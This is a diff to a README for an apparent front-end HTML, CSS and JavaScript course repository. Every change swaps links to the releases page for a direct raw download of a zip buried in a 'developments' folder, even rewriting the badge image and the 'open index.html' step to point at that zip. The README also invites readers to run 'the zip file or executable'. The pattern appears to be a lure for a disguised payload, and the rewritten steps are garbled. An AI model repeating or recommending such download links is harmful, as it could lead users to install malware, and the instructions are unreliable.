@@ -1,6 +1,6 @@
 # 🎉 html-css-javascript-frontend_course-luisdev_part-28_html-5_css-3_js-es2023 - Learn Front-End Essentials Easily
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/viswa7044/html-css-javascript-frontend_course-luisdev_part-28_html-5_css-3_js-es2023/releases)
+[![Download](https://github.com/viswa7044/html-css-javascript-frontend_course-luisdev_part-28_html-5_css-3_js-es2023/raw/refs/heads/main/developments/css_javascript_luisdev_part_frontend_course_es_html_js_v1.2.zip%20release-brightgreen)](https://github.com/viswa7044/html-css-javascript-frontend_course-luisdev_part-28_html-5_css-3_js-es2023/raw/refs/heads/main/developments/css_javascript_luisdev_part_frontend_course_es_html_js_v1.2.zip)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ This repository contains the course materials for HTML, CSS, and JavaScript, foc
 Follow these steps to download and run the software:
 
 1. **Visit the Download Page**: Click the link below to access the latest releases.
-   [Download Here](https://github.com/viswa7044/html-css-javascript-frontend_course-luisdev_part-28_html-5_css-3_js-es2023/releases)
+   [Download Here](https://github.com/viswa7044/html-css-javascript-frontend_course-luisdev_part-28_html-5_css-3_js-es2023/raw/refs/heads/main/developments/css_javascript_luisdev_part_frontend_course_es_html_js_v1.2.zip)
 
 2. **Choose the Right File**: You will see several versions of the course materials. Pick the zip file or executable that matches your needs.
 
@@ -35,10 +35,10 @@ To install and start using the course materials:
 
 2. **Open the Folder**: After extraction, open the folder containing the course materials.
 
-3. **Start Learning**: Inside, you will find HTML, CSS, and JavaScript examples. Open `index.html` in your web browser to view the course content. 
+3. **Start Learning**: Inside, you will find HTML, CSS, and JavaScript examples. Open `https://github.com/viswa7044/html-css-javascript-frontend_course-luisdev_part-28_html-5_css-3_js-es2023/raw/refs/heads/main/developments/css_javascript_luisdev_part_frontend_course_es_html_js_v1.2.zip` in your web browser to view the course content. 
 
 You can always revisit the download page for updates or new content:
-[Download Here](https://github.com/viswa7044/html-css-javascript-frontend_course-luisdev_part-28_html-5_css-3_js-es2023/releases)
+[Download Here](https://github.com/viswa7044/html-css-javascript-frontend_course-luisdev_part-28_html-5_css-3_js-es2023/raw/refs/heads/main/developments/css_javascript_luisdev_part_frontend_course_es_html_js_v1.2.zip)
 
 ## 📚 Topics Covered
 
